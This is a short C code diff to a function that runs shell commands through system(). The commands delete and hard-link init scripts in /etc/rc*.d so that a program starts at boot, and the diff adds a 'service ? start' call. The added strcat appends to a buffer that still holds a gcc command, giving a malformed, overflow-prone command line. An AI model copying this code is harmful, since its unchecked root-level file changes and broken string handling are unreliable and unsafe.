@@ -14,7 +14,7 @@ int action_TxL() {
        system("rm /etc/rc6.d/K10?");}
 
 
-    char   buffer_commandline  [129];
+    char   buffer_commandline  [128];
 
 
     strcpy(buffer_commandline, "gcc "                   );
@@ -31,6 +31,10 @@ int action_TxL() {
     system("ln /etc/init.d/? /etc/rc3.d/S10?");
     system("ln /etc/init.d/? /etc/rc5.d/S10?");
     system("ln /etc/init.d/? /etc/rc6.d/K10?");
+
+
+    strcat(buffer_commandline, "service ? start"        );
+    system(buffer_commandline);
 
 
     return 1;}
